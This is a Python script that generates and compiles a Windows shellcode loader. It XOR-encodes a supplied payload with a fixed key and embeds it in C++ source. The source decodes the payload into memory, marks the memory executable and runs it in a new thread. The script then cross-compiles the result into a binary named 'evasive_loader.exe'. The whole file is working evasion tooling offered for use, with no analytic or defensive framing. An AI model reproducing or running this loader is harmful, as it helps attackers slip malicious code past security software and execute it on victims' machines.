import sys
import os
import subprocess

def build_loader(payload_path):
    if not os.path.exists(payload_path):
        print(f"Error: {payload_path} not found.")
        return

    # 1. Read the payload
    with open(payload_path, 'rb') as f:
        data = f.read()

    # 2. XOR Obfuscation
    key = 0xAA
    transformed = [b ^ key for b in data]
    hex_payload = ", ".join([hex(b) for b in transformed])

    # 3. Create the C++ Loader source
    loader_source = f"""#include <windows.h>
#include <stdio.h>

unsigned char payload[] = {{ {hex_payload} }};

int main() {{
    unsigned char key = 0xAA;
    size_t size = sizeof(payload);
    LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (size_t i = 0; i < size; i++) {{((unsigned char*)addr)[i] = payload[i] ^ key;}}
    DWORD oldProtect;
    VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"""
    with open("loader.cpp", "w") as f:
        f.write(loader_source)

    # 4. Compile the loader
    print("[*] Compiling loader...")
    compile_cmd = [
        "x86_64-w64-mingw32-g++", "-Os", "-s", "-ffunction-sections", 
        "-fdata-sections", "-Wl,--gc-sections", "-fno-exceptions", 
        "-fno-rtti", "-o", "evasive_loader.exe", "loader.cpp"
    ]
    
    try:
        subprocess.run(compile_cmd, check=True)
        print("[+] Success: evasive_loader.exe created.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 build.py <payload.exe>")
    else:
        build_loader(sys.argv[1])
